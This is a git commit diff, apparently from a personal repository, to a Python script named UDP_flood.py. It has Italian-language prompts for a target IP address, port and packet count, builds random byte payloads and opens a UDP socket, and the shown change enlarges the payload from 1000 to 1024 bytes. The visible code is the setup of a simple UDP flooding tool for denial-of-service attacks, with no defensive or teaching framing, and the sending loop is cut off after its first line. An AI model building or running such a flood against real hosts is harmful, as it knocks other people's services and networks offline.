02389006a9a27589543d046cfd8bd4f2b52dc03a
skemasche <116719584+skemasche@users.noreply.github.com>
2022-11-08 17:26:53 +0100

    Update UDP_flood.py

--- UDP_flood.py
+++ UDP_flood.py
@@ -5,7 +5,7 @@ import random
 ip = input("Inserire indirizzo ip: ")
 porta =int( input("\n inserire porta:"))
 npak = int( input("\n inserire il numero di pacchetti da inviare:"))
-bytes = os.urandom(1000)
+bytes = os.urandom(1024)
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 puntapak= int(0)
 while 1 == 1:
